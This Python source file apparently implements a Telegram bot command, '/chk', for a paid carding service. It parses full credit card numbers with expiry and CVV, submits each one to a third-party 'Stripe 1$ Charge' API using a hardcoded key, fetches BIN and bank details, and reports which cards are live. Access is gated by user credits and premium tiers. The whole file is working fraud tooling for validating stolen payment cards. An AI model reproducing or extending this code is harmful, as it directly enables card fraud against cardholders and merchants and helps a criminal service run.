from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests, re, time
from plugins.func.users_sql import *
from datetime import date

session = requests.Session()

@Client.on_message(filters.command("chk"))
async def cmd_chk(client, message):
    try:
        user_id = str(message.from_user.id)
        username = message.from_user.username or "None"
        chat_id = message.chat.id
        chat_type = str(message.chat.type)

        regdata = fetchinfo(user_id)
        if not regdata:
            insert_reg_data(user_id, username, 0, str(date.today()))
            regdata = fetchinfo(user_id)

        status = regdata[2] or "FREE"
        role = status
        credit = int(regdata[5] or 0)
        wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
        antispam_time = int(regdata[7] or 0)
        now = int(time.time())

        GROUP = open("plugins/group.txt").read().splitlines()
        if chat_type == "ChatType.PRIVATE" and role == "FREE":
            return await message.reply(
                "Premium Users Required ⚠️\n"
                "Only Premium Users can use this command in PM.\n"
                "Join group for free use.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Join Group", url="https://t.me/BarryxChat")]
                ]),
                disable_web_page_preview=True
            )

        if chat_type in ["ChatType.GROUP", "ChatType.SUPERGROUP"] and str(chat_id) not in GROUP:
            return await message.reply("❌ Unauthorized group. Contact admin.")

        if credit < 1:
            return await message.reply("❌ Insufficient credit. Use /buy to recharge.")

        if now - antispam_time < wait_time:
            return await message.reply(f"⏳ AntiSpam: wait {wait_time - (now - antispam_time)}s")

        cc = message.reply_to_message.text if message.reply_to_message else message.text.replace('/chk', '').strip()
        match = re.search(r'(\d{12,16})[|:\s,-](\d{1,2})[|:\s,-](\d{2,4})[|:\s,-](\d{3,4})', cc)
        if not match:
            return await message.reply("❌ Invalid format. Use cc|mm|yy|cvv")

        ccnum, mes, ano, cvv = match.groups()
        fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"

        check_msg = await message.reply(
            f"┏━━━━━━━⍟\n"
            f"┃  Stripe 1$ Charge\n"
            f"┗━━━━━━━━━━━⊛\n"
            f"⊙ CC: {fullcc}\n"
            f"⊙ Status: Checking...\n"
            f"⊙ Response: Waiting for Response..."
        )

        tic = time.perf_counter()
        r = session.get(
            f"https://barryxapi.xyz/stripe_charge?key=BRY-FGKD5-MDYRI-56HDM&card={fullcc}",
            timeout=15
        )

        try:
            data = r.json()
            result = data.get("result", {})
            card_status = result.get("status", "").lower()
            card_message = result.get("message", "No message from gateway")
        except:
            card_status = "error"
            card_message = "Invalid response or server error"

        toc = time.perf_counter()

        try:
            binres = session.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}", timeout=10).json()
            brand = binres.get("vendor") or binres.get("scheme") or "UNKNOWN"
            type_ = binres.get("type", "N/A")
            level = binres.get("level", "N/A")
            bank = binres.get("bank", "N/A")
            country = binres.get("country_name", "N/A")
            flag = binres.get("country_flag", "")
        except:
            try:
                bininfo = session.get(f"https://lookup.binlist.net/{ccnum[:6]}", timeout=10).json()
                brand = bininfo.get("scheme", "UNKNOWN")
                type_ = bininfo.get("type", "N/A")
                level = bininfo.get("brand", "N/A")
                bank = bininfo.get("bank", {}).get("name", "N/A")
                country = bininfo.get("country", {}).get("name", "N/A")
                flag = bininfo.get("country", {}).get("emoji", "")
            except:
                brand = type_ = level = bank = country = flag = "N/A"

        brand = brand.upper()
        type_ = type_.upper()
        level = level.upper()
        bank = bank.upper()
        country = country.upper()

        status = "Approved ✅" if card_status in [
            "approved", "charged", "insufficient_funds", "incorrect_cvc"
        ] else "Declined ❌"

        msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Stripe 1$ Charge</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bank}
<b>⊚ Bin type:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""

        await client.edit_message_text(chat_id, check_msg.id, msg)
        updatedata(user_id, "credits", credit - 1)
        updatedata(user_id, "antispam_time", now)
        plan_expirychk(user_id)

    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")